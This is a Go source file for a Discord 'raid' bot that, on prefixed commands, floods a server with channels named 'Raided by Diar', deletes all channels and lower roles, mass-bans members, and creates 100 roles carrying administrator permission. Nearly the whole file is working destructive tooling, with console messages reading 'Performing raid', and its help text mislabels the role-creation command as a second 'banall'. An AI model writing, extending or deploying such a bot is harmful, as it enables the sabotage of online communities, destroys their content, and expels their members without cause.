package main

import (
	"fmt"
	"github.com/bwmarrin/discordgo"
	"github.com/fatih/color"
	"math/rand"
	"os"
	"os/signal"
	"strconv"
	"syscall"
)

var (
	clientID string
	prefix   string
	token    string
)

func main() {

	fmt.Println("Set BOT Token:")
	fmt.Scanln(&token)
	fmt.Println("Set BOT Prefix:")
	fmt.Scanln(&prefix)

	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println("Error creating discord session: ,", err)
		return
	}
	err = dg.Open()
	if err != nil {
		fmt.Println("Error:,", err)
		return
	}

	dg.AddHandler(MessageHandler)

	u, err := dg.User("@me")

	if err != nil {
		fmt.Println("Error:", err)
		return
	}

	clientID = u.ID

	fmt.Println("Connected as:", u)
	color.White("---------------------------------------------------------")
	color.Yellow(prefix + "channels -> Creates 55 channels on the server")
	color.Yellow(prefix + "delete -> Deletes ALl channels on the server")
	color.Yellow(prefix + "banall -> Bans all the members with lower role on the server")
	color.Yellow(prefix + "roledelete -> Deletes all the roles with a lower position that bot's role")
	color.Yellow(prefix + "banall -> Creates 100 roles on the server.")
	color.White("---------------------------------------------------------")
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<-sc

	dg.Close()

}

func MessageHandler(s *discordgo.Session, m *discordgo.MessageCreate) {
	guildID := m.GuildID

	g, err := s.Guild(guildID)

	if err != nil {
		fmt.Println("Error fetching Guild:", err)
		return
	}

	guildChannels, err := s.GuildChannels(guildID)

	if err != nil {
		fmt.Println("Error fetching Guild Channels:", err)
		return
	}

	guildMembers, err := s.GuildMembers(guildID, "0", 1000)

	if err != nil {
		fmt.Println("Error fetching Guild Members:", err)
		return
	}

	guildRoles, err := s.GuildRoles(guildID)

	if err != nil {
		fmt.Println("Error fetching Guild Roles", err)
		return
	}

	if m.Content == prefix+"channels" {
		color.Yellow("Performing raid at: " + color.RedString(g.Name) + " (CCHAN)")
		color.White("---------------------------------------------------------")
		color.Yellow("Creating 5 text channels at: " + color.RedString(g.Name))
		color.White("---------------------------------------------------------")
		for x := 0; x < 5; x++ {
			s.GuildChannelCreate(guildID, "Raided by Diar", 0)
			color.Yellow("Created text channel N" + strconv.Itoa(x+1) + " at: " + color.RedString(g.Name))
		}
		color.White("---------------------------------------------------------")
		color.Yellow("Created 5 text channels at: " + color.RedString(g.Name))
		color.White("---------------------------------------------------------")
		color.Yellow("Creating 50 voice channels at: " + color.RedString(g.Name))
		color.White("---------------------------------------------------------")
		for x := 0; x < 50; x++ {
			s.GuildChannelCreate(guildID, "Raided by Diar", 2)
			color.Yellow("Created voice channel N" + strconv.Itoa(x+1) + " at: " + color.RedString(g.Name))
		}
		color.White("---------------------------------------------------------")
		color.Yellow("Created 50 voice channels at: " + color.RedString(g.Name))
		color.White("---------------------------------------------------------")
	}

	if m.Content == prefix+"delete" {

		color.Yellow("Performing raid at: " + color.RedString(g.Name) + " (DCHAN)")
		color.White("---------------------------------------------------------")
		color.Yellow("Starting to delete " + color.RedString(strconv.Itoa(len(guildChannels))+" channels"))
		color.White("---------------------------------------------------------")
		for x := range guildChannels {
			s.ChannelDelete(guildChannels[x].ID)
			color.Yellow("Deleted channel N" + strconv.Itoa(x+1) + " at: " + color.RedString(g.Name))
		}
		color.White("---------------------------------------------------------")
		color.Yellow("Successfully deleted " + color.RedString(strconv.Itoa(len(guildChannels))+" channels"))
		color.White("---------------------------------------------------------")
	}

	if m.Content == prefix+"banall" {
		var notBanned int

		color.Yellow("Performing raid at: " + color.RedString(g.Name) + " (BALL)")
		color.HiBlue("Members with a higher role than bot's won't get banned.")
		color.White("---------------------------------------------------------")
		color.Yellow("Starting to ban " + color.RedString(strconv.Itoa(len(guildMembers))+" members"))
		color.White("---------------------------------------------------------")
		for x := range guildMembers {

			err := s.GuildBanCreate(guildID, guildMembers[x].User.ID, 0)
			if err != nil {
				color.Yellow("Couldn't ban user N" + strconv.Itoa(x+1) + " with name " + color.RedString(guildMembers[x].User.Username) + color.YellowString(" at: "+color.RedString(g.Name)))
				color.Yellow("Error:\n" + color.RedString(err.Error()))
				notBanned += 1
				continue
			}
			color.Yellow("Baned user N" + strconv.Itoa(x+1) + " with name " + color.RedString(guildMembers[x].User.Username) + color.YellowString(" at: "+color.RedString(g.Name)))
		}
		color.White("---------------------------------------------------------")
		color.Yellow("Successfully banned " + color.RedString(strconv.Itoa(len(guildMembers)-notBanned)+" member(s)	"))
		color.White("---------------------------------------------------------")
	}

	if m.Content == prefix+"roledelete" {
		var notDeleted int

		color.Yellow("Performing raid at: " + color.RedString(g.Name) + " (DROL)")
		color.HiBlue("Roles with a higher position than bot's won't get deleted.")
		color.White("---------------------------------------------------------")
		color.Yellow("Starting to delete " + color.RedString(strconv.Itoa(len(guildRoles))+" roles"))
		color.White("---------------------------------------------------------")
		for x := range guildRoles {

			err := s.GuildRoleDelete(guildID, guildRoles[x].ID)

			if err != nil {
				color.Yellow("Couldn't delete role N" + strconv.Itoa(x+1) + " with name " + color.RedString(guildRoles[x].Name) + color.YellowString(" at: ") + color.RedString(g.Name))
				color.YellowString("Error:\n" + color.RedString(err.Error()))
				notDeleted += 1
				continue
			}
			color.Yellow("Deleted role N" + strconv.Itoa(x+1) + " with name " + color.RedString(guildRoles[x].Name) + color.YellowString(" at: ") + color.RedString(g.Name))
		}
		color.White("---------------------------------------------------------")
		color.Yellow("Successfully deleted " + color.RedString(strconv.Itoa(len(guildRoles)-notDeleted)+" roles"))
		color.White("---------------------------------------------------------")
	}
	if m.Content == prefix+"rolecreate" {
		color.Yellow("Performing raid at: " + color.RedString(g.Name) + " (CROL)")
		color.White("---------------------------------------------------------")
		color.Yellow("Starting to create " + color.RedString("100 roles"))
		color.White("---------------------------------------------------------")
		for x := 0; x < 100; x++ {
			r, err := s.GuildRoleCreate(guildID)
			if err != nil {
				color.YellowString("Error:\n" + color.RedString(err.Error()))
				return
			}

			e, err := s.GuildRoleEdit(guildID, r.ID, randStr(6), 8524087, false, 8, false)

			if err != nil {
				color.YellowString("Error:\n" + color.RedString(err.Error()))
				return
			}

			color.Yellow("Created role N" + strconv.Itoa(x+1) + " with name " + color.RedString(e.Name) + color.YellowString(" at: ") + color.RedString(g.Name))
		}
		color.White("---------------------------------------------------------")
		color.Yellow("Successfully created " + color.RedString("100 roles"))
		color.White("---------------------------------------------------------")
	}
}
const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

func randStr(l int) string {
	fString := make([]byte, l)
	for i := range fString {
		fString[i] = letters[rand.Intn(len(letters))]
	}
	return string(fString)
}
